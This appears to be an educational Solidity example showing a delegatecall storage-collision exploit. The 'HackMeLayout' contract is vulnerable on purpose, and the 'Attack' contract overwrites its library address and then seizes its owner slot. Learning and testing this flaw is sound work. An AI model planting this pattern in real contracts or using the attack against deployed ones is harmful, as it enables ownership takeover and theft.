// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Libre {
    uint public aNum;
    
    function doThis(uint _num) public {
        aNum = _num;
    }
}

contract HackMeLayout {
    address public libre;
    address public owner;
    uint public aNum;
    
    constructor(address _libre) {
        libre = _libre;
        owner = msg.sender;
    }
    
    function doThis(uint _num) public {
        libre.delegatecall(abi.encodeWithSignature("doThis(uint256)", _num));
    }
}

contract Attack {
    // Similar storage layout as Libre 
    // allowing correct state variables update
    address public libre;
    address public owner;
    uint public aNum;
    
    HackMeLayout public hackMe;
    
    constructor(HackMeLayout _hackMe) {
        hackMe = HackMeLayout(_hackMe);
    }
    
    function attack() public {
        // override address of libre
        hackMe.doThis(uint(uint160(address(this)))); 
        hackMe.doThis(1); 
    }
    
    function doThis(uint _num) public {
        owner = msg.sender;
    }
}